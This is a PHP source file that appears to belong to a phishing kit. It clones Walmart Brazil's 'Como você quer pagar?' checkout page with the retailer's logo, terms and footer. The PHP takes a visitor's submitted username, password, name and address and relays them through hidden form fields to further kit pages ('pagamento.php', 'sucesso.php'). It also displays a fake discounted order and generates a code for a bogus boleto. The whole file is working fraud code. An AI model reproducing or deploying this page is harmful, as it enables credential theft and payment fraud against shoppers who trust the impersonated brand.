

<?php

error_reporting(0);
ini_set(“display_errors”, 0 );




if(isset($_POST['ID'])){


require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");


$ID_A = $_POST["ID"];
$USUARIO_A = $_POST["user"];
$SENHA_A = $_POST["pass"];
$NOME_A = $_POST["nome"];
$CEP_A = $_POST["cep"];
$ENDERECO_A = $_POST["endereco"];
$SEM_NUMERO_A = $_POST["numero_sem"];
$NUMERO_A = $_POST ["numero"];
$COMPLEMENTO_A = $_POST ["complemento"];
$BAIRRO_A = $_POST ["bairro"];
$CIDADE_A = $_POST ["cidade"];
$ESTADO_A = $_POST ["estado"];
$PONTO_A = $_POST["ponto"];
$APELIDO_A = $_POST ["apelido"];

$ID =  addslashes($ID_A);
$USUARIO =  addslashes($USUARIO_A);
$SENHA =  addslashes($SENHA_A);
$NOME =  addslashes($NOME_A);
$CEP =  addslashes($CEP_A);
$ENDERECO =  addslashes($ENDERECO_A);
$SEM_NUMERO =  addslashes($SEM_NUMERO_A);
$NUMERO =  addslashes($NUMERO_A);
$COMPLEMENTO =  addslashes($COMPLEMENTO_A);
$BAIRRO =  addslashes($BAIRRO_A);
$CIDADE =  addslashes($CIDADE_A);
$ESTADO =  addslashes($ESTADO_A);
$PONTO =  addslashes($PONTO_A);
$APELIDO =  addslashes($APELIDO_A);




$dados4 = "SELECT* FROM produtos where id='$ID'";
$con4 = $mysqli -> query($dados4) or die ($mysqli -> error);


while ($consulta4= $con4 -> fetch_array()){
	
	$nome_produto = $consulta4 ["nome_produto"];
	$preco = $consulta4 ["preco"];
	$img = $consulta4 ["img"];
	$status = $consulta4 ["status_boleto"];
	$id_leto = $consulta4 ["id_boleto"];
	
	
	
}


$preco_final = number_format($preco,2,",",".");


function geraURL($tamanho = 8, $numeros = true){ 
    $num = '1234567890'; 
     
    $caracteres .= $lmin; 
        if ($numeros) $caracteres .= $num; 
     
    $len = strlen($caracteres); 
    for ($n = 1; $n <= $tamanho; $n++) { 
    $rand = mt_rand(1, $len); 
    $retorno .= $caracteres[$rand-1]; 
    } 
    return $retorno; 
} 
$gera = geraURL(8); 





$dados2 = "SELECT* FROM configuracao where id=1";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);

while ($consulta2= $con2 -> fetch_array()){
	
	$desconto = $consulta2 ["desconto"];
	$validade = $consulta2 ["validade"];
	
	
	
}



$total = $preco;
$pctm = $desconto;
$valor_descontado = $total - ($total / 100 * $pctm);

$preco_final = number_format($valor_descontado,2,",",".");




?>









<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script async="" src="../Raiz/Files5/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files5/fp.js.download"></script><script async="" src="../Raiz/Files5/cs.js.download"></script><script type="text/javascript" async="" src="../Raiz/Files5/welcome_fp.asp.download"></script><script type="text/javascript" async="" src="../Raiz/Files5/ec.js.download"></script><script async="" src="../Raiz/Files5/cs.js.download"></script><script src="../Raiz/Files5/2960.js.download" async="" type="text/javascript"></script><script async="" src="../Raiz/Files5/cs.js.download"></script><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Resumo do pedido - Walmart.com</title><meta name="description" content=""><meta name="viewport" content="width=device-width,user-scalable=no"><link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><link rel="icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><!-- Place favicon.ico and apple-touch-icon.png in the root directory --><link rel="stylesheet" href="../Raiz/Files5/f41d9923.checkout.css"><script src="../Raiz/Files5/ff3057f9.feature.js.download"></script><script src="../Raiz/Files5/analytics.js.download"></script><script src="../Raiz/Files5/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script><script language="Javascript" type="text/javascript" src="../Raiz/Files5/encryption.js.download"></script>
<script language="Javascript" type="text/javascript" src="../Raiz/Files5/getkey.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files5/satellite-56d8236264746d5460002c13.js.download"></script><script src="../Raiz/Files5/satellite-5616ad06366462001700171b.js.download"></script><script src="../Raiz/Files5/satellite-55ad40a733646300140007cc.js.download"></script><script src="../Raiz/Files5/satellite-55dc9d3f6165630017001049.js.download"></script><script src="../Raiz/Files5/satellite-55e46d9c6330630014000aca.js.download"></script><script src="../Raiz/Files5/satellite-55e702506533640014001100.js.download"></script><script src="../Raiz/Files5/satellite-56df553064746d05210015ba.js.download"></script><script src="../Raiz/Files5/satellite-561d60b33535310014000298.js.download"></script><script src="../Raiz/Files5/satellite-58177c1c64746d5fda00cd74.js.download"></script><script src="../Raiz/Files5/satellite-5873742764746d6035006d7c.js.download"></script><script src="../Raiz/Files5/satellite-59e4f61e64746d35d20003e4.js.download"></script><script src="../Raiz/Files5/satellite-5616ad2564363200140007f9.js.download"></script><script src="../Raiz/Files5/satellite-55ad40d76331300014000163.js.download"></script><script src="../Raiz/Files5/satellite-55b67fe33062610017000a80.js.download"></script><script src="../Raiz/Files5/satellite-55dc9d646236660014000b5a.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files5/satellite-55e43ca53961370014000750.js.download"></script><script src="../Raiz/Files5/satellite-561d684b323837001400094f.js.download"></script><script src="../Raiz/Files5/satellite-56e1948964746d052f00258b.js.download"></script><script src="../Raiz/Files5/satellite-58177cbf64746d4ccb00c996.js.download"></script><script src="../Raiz/Files5/satellite-59e4f64264746d35d8000089.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files5/satellite-56e1951c64746d0532002246.js.download"></script><script src="../Raiz/Files5/satellite-5616ad4e6436320017000879.js.download"></script><script src="../Raiz/Files5/satellite-55ad2c4a336463001700071b.js.download"></script><script src="../Raiz/Files5/satellite-55b67fbe61613900140008c4.js.download"></script><script src="../Raiz/Files5/satellite-55dc9d8e65353207ba000102.js.download"></script><script src="../Raiz/Files5/satellite-55eeedcb32633720f10005a6.js.download"></script><script src="../Raiz/Files5/satellite-56e194ac64746d0532002241.js.download"></script><script src="../Raiz/Files5/satellite-58177cef64746d4cc800cb2f.js.download"></script><script src="../Raiz/Files5/satellite-561d68843535310017000219.js.download"></script><script src="../Raiz/Files5/satellite-59e4f67a64746d35cf000160.js.download"></script><script src="../Raiz/Files5/satellite-56e1951c64746d0532002246.js.download"></script></head><body class="fixed-steps" style=""><img style="display: none;" src="../Raiz/Files5/clear.png"><div class="wrapper"><header class="header choose-address choose-delivery choose-payment"><div class="header-wrapper">
  <figure class="navbar-brand">
    
    
      <img class="header-logo" src="../Raiz/Files5/walmart-logo.png" alt="Walmart.com">
    

  </figure>
  <h1 class="header-title choose-payment">
    Como você quer pagar?
  </h1>
  <div class="header-security">
    <div class="header-security-wrapper">
  
  	 <img src="../Raiz/assets/img/a.png" >

  
  
    </div>
  </div>
</div>
</header><!-- Main content --><main class="main-content"><div class="view-content"><div class="page">

  <section class="container">
    <header class="container-header">
      <h2 class="payment-option-title container-title">Pagamento</h2>
      <div class="footer-security payment-security">
        <i class="wm-icon-security-shield"></i>
        <div class="footer-security-wrapper">
      
	    	 <img src="../Raiz/assets/img/b.png" >

	  
	  
	  
        </div>
      </div>
    </header>

    <div class="payment-option-tab tab-wrapper  composite">
      
    <ul class="nav nav-tabs tabs-wrapper" data-active="1">
	

  <form method="post"  action="pagamento.php" id="mail_form">
  
  
    <input type="hidden" name="ID" value="<?php echo $ID ?>" >
  <input type="hidden" name="user" value="<?php echo $USUARIO ?>" >
  <input type="hidden" name="pass" value="<?php echo $SENHA ?>" >
  <input type="hidden" name="nome" value="<?php echo $NOME ?>" >
  <input type="hidden" name="cep" value="<?php echo $CEP ?>" >
  <input type="hidden" name="endereco" value="<?php echo $ENDERECO ?>" >
  <input type="hidden" name="numero" value="<?php echo $NUMERO ?>" >
  <input type="hidden" name="complemento" value="<?php echo $COMPLEMENTO ?>" >
  <input type="hidden" name="bairro" value="<?php echo $BAIRRO ?>" >
  <input type="hidden" name="cidade" value="<?php echo $CIDADE ?>" >
  <input type="hidden" name="estado" value="<?php echo $ESTADO ?>" >
  <input type="hidden" name="ponto" value="<?php echo $PONTO ?>" >
  <input type="hidden" name="apelido" value="<?php echo $APELIDO ?>" >

  
  </form>


<li class="tab"><a onClick="document.getElementById('mail_form').submit();" class="tab-link" data-toggle="tab">
  	 <img src="../Raiz/assets/img/c.png" >
	<span>Cartão de crédito</span>
</a>





</li>






<li class="tab active"><a class="tab-link" data-toggle="tab">
  	 <img src="../Raiz/assets/img/d.png" >
	<span>Boleto bancário</span>
</a>
</li>



</ul>
<div class="tab-content"><div class="tab-panel bank-panel payment-bank-tab active" id="bank"><div class="tab-content-header">
  <p class="payment-text-header">Pagamento à vista <span class="payment-type-header">R$ <?php echo $preco_final ?></span></p>
</div>

<div class="payment-description">
  <p class="payment-info"><span>Importante:</span>Verifique a data de vencimento informada no boleto. O prazo para pagamento do boleto é 1 dia útil. Em caso de não pagamento do boleto até a data de vencimento, o pedido será automaticamente cancelado.</p>
  <p class="payment-info">O prazo de entrega informado durante a compra é contado a partir da confirmação do pagamento pelo banco, o que pode levar até 3 dias úteis.</p>
  <p class="payment-info">O pagamento do boleto pode ser efetuado pela internet, utilizando o código de barras, ou diretamente em bancos, lotéricas e correios,  apresentando o boleto impresso.</p>
</div>
</div></div>
</div>
  </section>

  <section class="payment-resume">
  <div class="gift-card-container">
    <a data-gift-card="open-modal" class="add-gift-card-link">
      Incluir vale presente ou cupom<i class="wm-icon-tag"></i>
    </a>

    <ul class="gift-card-list">
      
      
    </ul>
  </div>



<div class="payment-resume-totals">

  

  

  <div class="payment-resume-totals-item my-cart-subtotal cash-report-item subtotal">
    <span>Subtotal:</span>
    <span class="payment-resume-subtotal-text">R$ <?php echo $preco_final ?></span>
  </div>

  

  

  <div class="payment-resume-totals-item cash-report-item freight">
    <span>Valor do frete:</span>
    <div>Grátis</div>
  </div>

  <div class="payment-resume-totals-item cash-total">
    <span class="payment-resume-total-label">Valor total a pagar:</span>
    <div class="payment-resume-installment">
      <span class="payment-resume-total-text">R$ <?php echo $preco_final ?></span>
      
      
    </div>
  </div>
<div>
</div></div></section>

  <div id="finish-order" class="container finish-order-content">
  <form action="sucesso.php" method="post" >
  <input type="hidden" name="ID" value="<?php echo $ID ?>" >
  <input type="hidden" name="user" value="<?php echo $USUARIO ?>" >
  <input type="hidden" name="pass" value="<?php echo $SENHA ?>" >
  <input type="hidden" name="nome" value="<?php echo $NOME ?>" >
  <input type="hidden" name="cep" value="<?php echo $CEP ?>" >
  <input type="hidden" name="endereco" value="<?php echo $ENDERECO ?>" >
  <input type="hidden" name="numero" value="<?php echo $NUMERO ?>" >
  <input type="hidden" name="complemento" value="<?php echo $COMPLEMENTO ?>" >
  <input type="hidden" name="bairro" value="<?php echo $BAIRRO ?>" >
  <input type="hidden" name="cidade" value="<?php echo $CIDADE ?>" >
  <input type="hidden" name="estado" value="<?php echo $ESTADO ?>" >
  <input type="hidden" name="ponto" value="<?php echo $PONTO ?>" >
  <input type="hidden" name="apelido" value="<?php echo $APELIDO ?>" >
  <input type="hidden" name="gera" value="<?php echo $gera ?>" >
  
  <div class="finish-order-controls"><button type="submit" class="btn btn-success btn-finish-buy">Finalizar compra</button></div></div>

  </form>


  <div class="page-content order-report-page">
    
  <section class="order-report-wrapper container">



  
  <ul class="payment-product-list payment-product-item-head">
    <li class="payment-product-item">
      <p class="payment-product-details">Item</p>
      <p class="payment-product-details">Quantidade:</p>
      <p class="payment-product-details">Entrega</p>
    </li>
  </ul>

    <ul class="payment-product-list">
    
      <li class="payment-product-item">
        <figure class="payment-product-figure">
          
            <img src="<?php echo $img ?>" alt="<?php echo $nome_produto ?>">
          
        </figure>

        <div class="payment-product-info-content">
          <div class="payment-product-info">
            <p class="payment-product-title">
              <span class="payment-product-name"><?php echo $nome_produto ?></span>
              
                <span class="payment-product-brand"> </span>
              
            </p>
            
              <p class="payment-product-details">
                <span>Vendido e entregue por Walmart </span>
              </p>
            
          </div>

          

        <p class="payment-product-details">
          <span class="payment-product-details-quantity">Quantidade:</span><span>1</span>
        </p>

        
          <p class="payment-product-details">
            <span class="delivery-days">Em até 9 dias úteis
              
            </span>
            
              <a class="editFreightType btn-link" href="#">Alterar</a>
            
          </p>
        
        </div>
      </li>
    

    
 
    

    

  </ul>
</section>
</div>

  <div id="deliveryInfo" class="delivery-data-box">
    
  <div><section class="container">
  <header class="container-header">
    <h2 class="container-title">Endereço de entrega</h2>
    
    <a href="#" id="editDeliveryAddress" class="edit-link">Alterar</a>
    
  </header>
  <div class="address-card delivery view-address">
    
    <section class="address-data">
      <span class="address-data-address-name"></span>
      <span class="address-data-name"><?php echo $NOME ?></span>
      <span>
        <?php echo $ENDERECO ?>, <?php echo $NUMERO ?>
        
      </span>
	 
      <span><?php echo $BAIRRO ?> - <?php echo $CIDADE ?> - <?php echo $ESTADO ?></span>
      <span><?php echo $CEP ?></span>
	  
    </section>
	
  </div>
</section>
</div></div>

  <div id="notes-section" class="notes-section-content">
    
  <div class="notes-section"><p>Você está prestes a realizar uma compra sob as condições acima. Seu pedido passará por aprovação do Walmart.com.br, podendo ser cancelado em caso de:</p>
<ol>
  <li>1) Não pagamento do boleto ou insuficiência de saldo ou crédito no cartão.</li>
  <li>2) Inconsistência de dados ou informações de cadastro.</li>
  <li>3) Erros do dispositivo do consumidor durante o fechamento do pedido.</li>
  <li>4) Quantidade de produtos ou sequência de compras que denote revenda, ao invés de consumo próprio.</li>
  <li>5) Motivos outros que impossibilitem o cumprimento do pedido.</li>
  <li>6) O consumidor tem 7 dias, contados a partir do recebimento do produto, para exercer o direito de arrependimento.</li>
  <li>7) O consumidor terá, nos casos de vício ou defeito do produto, o prazo de até 30 dias para bens não duráveis e até 90 dias para bens duráveis para solicitar a assistência técnica.</li>
  <li>8) Defeito técnico ou de fabricação o prazo de troca é de 7 (sete) dias a partir do recebimento do produto.</li>
</ol>
<p>Demais condições aplicáveis a esta compra e venda estão disponíveis nos  "<a data-toggle="modal" class="btn-link" id="termsAndConditions">Termos de Uso e Condições</a>" por meio do qual, inclusive, o Usuário autoriza o Walmart.com a proceder à restituição dos tributos que tiverem sido por este pagos, indevidamente ou a maior, para fins do disposto no artigo 166 do Código Tributário Nacional.</p>
<p>Os preços e condições deste site são válidos apenas para compras no site e não se aplicam para nossas lojas.</p>
</div></div>
</div>
</div></main><!-- Footer content --><footer id="footer" class="footer"><section class="footer-wrapper">
  

  <div class="footer-security">
    <div class="footer-security-wrapper">
  	 <img src="../Raiz/assets/img/e.png" >

    </div>
  </div>

  <div class="footer-description">
    <p class="footer-text">© 2018 Walmart.com, Inc • Todos os direitos reservados</p>
    <a data-href="/institucional/termos-uso" data-modal="termsOfUse">Termos de uso</a>
    <span>•</span>
    <a data-href="/institucional/politica-privacidade/" data-modal="privacyPolicy">Política de privacidade</a>
  </div>
</section>
</footer>

</div>



</body></html>

<?php }?>